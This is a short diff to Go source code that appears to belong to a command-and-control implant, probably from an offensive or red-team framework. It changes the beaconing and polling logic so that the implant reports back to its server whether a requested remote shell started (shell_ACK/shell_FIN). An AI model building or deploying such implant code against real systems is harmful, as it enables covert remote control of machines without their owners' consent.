@@ -266,7 +266,7 @@ func do_cmd(body []byte) bool {
 }
 
 
-func poll_for_work(max_duration time.Duration, max_attempts int, freq time.Duration){
+func poll_for_work(max_duration time.Duration, max_attempts int, freq time.Duration) bool{
     attempts := 0
     start := time.Now()
 
@@ -274,24 +274,28 @@ func poll_for_work(max_duration time.Duration, max_attempts int, freq time.Durat
         b := get_beacon()
         cmd := send_msg(b)
         if do_cmd(cmd){
-            return
+            return true
         }
     }
+    return false
 }
 
 func shell() {
 	cmd := send_msg(url.Values{"shell_ACK": {"True"}})
+    success := "False"
     if !do_cmd(cmd) {
         // Settings are pretty arbitrary for now
         max_duration := time.Duration(atoi(SETTINGS["beacon"].(string)) * 5)
         max_attempts := 30
         freq := time.Second
         //ensure we have done the next command from the server (probably the shell) before sending shell_FIN
-        poll_for_work(max_duration, max_attempts, freq)
+        if poll_for_work(max_duration, max_attempts, freq) {
+            success = "True"
+        }
     }
     //Give the shell a bit to start, just in case
     sleep(1)
-    send_msg(url.Values{"shell_FIN": {"True"}})
+    send_msg(url.Values{"shell_FIN": {success}})
 }
 
 func atoi(s string) int{
